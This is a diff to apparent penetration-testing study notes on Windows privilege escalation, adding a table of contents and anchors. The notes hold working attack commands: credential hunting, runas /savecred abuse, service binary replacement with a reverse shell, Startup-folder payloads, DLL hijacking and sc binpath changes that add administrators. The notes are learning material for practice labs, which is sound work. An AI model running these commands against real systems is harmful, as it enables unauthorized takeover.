@@ -1,6 +1,27 @@
 # Windows Privelege Escalation
 
-## 1. System Enumeration
+# Table of Contents
+1. [System Enumeration](#System_Enumeration)
+2. [User Enumeration](#User_Enumeration)
+3. [Network Enumeration](#Network_Enumeration)
+4. [Password Hunting](#Password_Hunting)
+5. [AV and Firewall Enumeration](#AV_and_Firewall_Enumeration)
+6. [Automated Enumeration Tools](#Automated_Enumeration_Tools)
+7. [Kernel Exploits](#Kernel_Exploits)
+8. [Escalation with Metasploit](#Escalation_with_Metasploit)
+9. [Manual Escalation](#Manual_Escalation)
+10. [Password and Port Forwarding](#Password_and_Port_Forwarding)
+11. [Windows subsystem for Linux](#Windows_subsystem_for_Linux)
+12. [Token Impersonation](#Token_Impersonation)
+13. [getsystem](#getsystem)
+14. [Runas](#Runas)
+15. [Registry](#Registry)
+16. [Executable File running as a Service](#Executable_File_running_as_a_Service)
+17. [Startup Application](#Startup_Application)
+18. [DLL Hijacking](#DLL_Hijacking)
+19. [Binary path or bin path](#Binary_path)
+20. [Unquoted Service Path](#Unquoted_Service_Path)
+## 1. System Enumeration <a name="System_Enumeration"></a>
 - `systeminfo` for getting details of the system.
 	- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` to get filter information just like `grep` in linux.
 - `wmic qfe` to find its patched.
@@ -9,7 +30,7 @@
 	- `wmic logicaldisk get caption,description,providername` to get only columns needed.
 	- `wmic logicaldisk get caption` to only get drive caption
 
-## 2. User enumeration
+## 2. User enumeration <a name="User_Enumeration"></a>
 - `whoami` to see who we are.
 	- `whoami /priv` to check our privileges.
 	- `whoami /groups` to check the groups we are involved in.
@@ -18,7 +39,7 @@
 - `net localgroup`
 	- `net localgroup administrators` to see who is part of that group.
 
-## 3. Network Enumeration
+## 3. Network Enumeration <a name="Network_Enumeration"></a>
 - `ipconfig` to see what is the IP address of the machine.
 	- `ipconfig /all` to see more information
 - `arp -a` to see arp table.
@@ -26,14 +47,14 @@
 - `route print` to see route table.
 - `netstat -ano` to see what port is out there.
 
-## 4. Password Hunting
+## 4. Password Hunting <a name="Password_Hunting"></a>
 - `findstr /si password *.txt *.ini *.config`
 	- Maybe user have put the passwords in clear text or in registry. The above will command will parse for "password" in txt,.ini,.config files in the directory.
 	- We can even search for WiFi Passwords because user can reuse the same password.
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
 
-## 5. AV and Firewall Enumeration
+## 5. AV and Firewall Enumeration<a name="AV_and_Firewall_Enumeration"></a>
 - `sc query windefend` - `sc` for service control. This command will show information of windows defender.
 - `sc queryex type= service` to check all services running and see what we are up against. Like is there any antivirus etc.
 - `netsh advfirewall firewall dump` newer command
@@ -42,7 +63,7 @@
 
 windows PrivEsc Checklist (https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
 
-## 6. Automated Enumeration Tools
+## 6. Automated Enumeration Tools <a name="Automated_Enumeration_Tools"></a>
 - Executables
 	- winPEAS.exe (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 		- check winPEAS.bat if .exe doesn't work
@@ -57,26 +78,26 @@ windows PrivEsc Checklist (https://book.hacktricks.xyz/windows/checklist-windows
 	- windows-exploit-suggester.py (local) (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 	- Exploit Suggester (Metasploit) (https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
 
-## 7. Kernel Exploits
+## 7. Kernel Exploits <a name="Kernel_Exploits"></a>
 
 **Kernel**: Facilitates hardware and software components.
 
 Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
 
-## 8. Escalation with Metasploit
+## 8. Escalation with Metasploit <a name="Escalation_with_Metasploit"></a>
 - In meterpreter shell `run post/multi/recon/local_exploit_suggester`
 - background the meterpreter session
 - `use [exploit_path]`
 - `set options`
 - `run`
 
-## 9. Manual Escalation
+## 9. Manual Escalation <a name="Manual_Escalation></a>
 - Run windows exploit suggester
 - check for exploits that can be done from the shell. For example exploits needed gui interface to spawn shell etc.
 - Enumerate and find services. Look for any vulnerabilities found with exploitdb or anything.
 
 ***
-## 10. Password and Port Forwarding (chatterbox HTB)
+## 10. Password and Port Forwarding (chatterbox HTB) <a name="Password_and_Port_Forwarding></a>
 https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
 1. Run nmap and found achat vulberability
 2. Found exploit in exploitdb
@@ -88,7 +109,7 @@ https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_win
 8. Edit `/etc/ssh/sshd_config` and change `PermitRootLogin yes` then save and `ssh restart`
 9. Use plink.exe for port forwarding and then login as administartor. `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`
 ***
-## 11. Windows subsystem for Linux
+## 11. Windows subsystem for Linux <a name="Windows_subsystem_for_Linux"></a>
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl
 1. Get the low-priv shell using anyway like impacket anything.
 2. Find bash.exe and wsl.exe
@@ -100,7 +121,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 6. Check history etc for password.
 7. Login to Windows as administrator.
 
-## 12. Token Impersonation
+## 12. Token Impersonation <a name="Token_Impersonation"></a>
 
 Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
 
@@ -166,12 +187,12 @@ Juicy Potato: https://github.com/ohpe/juicy-potato
 
 Alternative Data Stream: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
 
-## 13. getsystem
+## 13. getsystem <a name="getsystem"></a>
 In metasploit meterpreter run `getsystem` it will try to escalate privileges.
 
 getsystem explanation: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
 
-## 14. Runas
+## 14. Runas <a name="Runas"></a>
 
 ### Example (Access HTB):
  `cmdkey /list` will look for stored credentials in the system. Or we can use WinPeas etc.
@@ -195,7 +216,7 @@ getsystem explanation: https://blog.cobaltstrike.com/2014/04/02/what-happens-whe
 2. `cmdkey /list`
 3. `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"`
 
-## 15. Registry
+## 15. Registry <a name="Registry"></a>
 
 ### 15.1 Registry Escalation - Autorun
 1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` for  query the registry for AutoRun executables. Also we can use "autorun64.exe" by sysinternals too.
@@ -249,7 +270,7 @@ Another method is...
 8. `sc start refsvc`
 9. `net localgroup administrators` to confirm.
 
-## 16. Executable File running as a Service
+## 16. Executable File running as a Service <a name="Executable_File_running_as_a_Service"></a>
 1.  `powershell -ep bypass`
 2. `. .\PowerUp.ps1`
 3. `Invoke-AllChecks` it will look for different checks.
@@ -260,7 +281,7 @@ Another method is...
 6.	`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
 7.	`net start filepermsvc`
 
-## 17. Startup Application
+## 17. Startup Application <a name="Startup_Application"></a>
 1. `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` So if we get "BUILTIN\Users:(F)" That means we have full access.
 2. Create a payload and drop the payload in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" and start a listner in Kali.
 3. When administrator login we have  a shell.
@@ -280,7 +301,7 @@ When windows boot up it will look for dll files. If dll files doesn't exist and 
 7. `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
 8.  Or we can create payload and replacing etc.
 
-## 19. Binary path or bin path
+## 19. Binary path or bin path <a name="Binary_path"></a>
 1.  `powershell -ep bypass`
 2. `. .\PowerUp.ps1`
 3. `Invoke-AllChecks` it will look for different checks.
@@ -295,7 +316,7 @@ When windows boot up it will look for dll files. If dll files doesn't exist and 
 	4. We can change config of this path by `sc config daclsvc binpath="net localgroup administrators user /add"`
 	5. `sc start daclsvc`
 	
-## 20. Unquoted Service Path
+## 20. Unquoted Service Path <a name="Unquoted_Service_Path"></a>
 If the path is not quoted and if are trying to run "C:\Program FIles\Test\test.exe"
 It will try to run the test.exe starting from C:\ till it find test.exe.
 1.  `powershell -ep bypass`
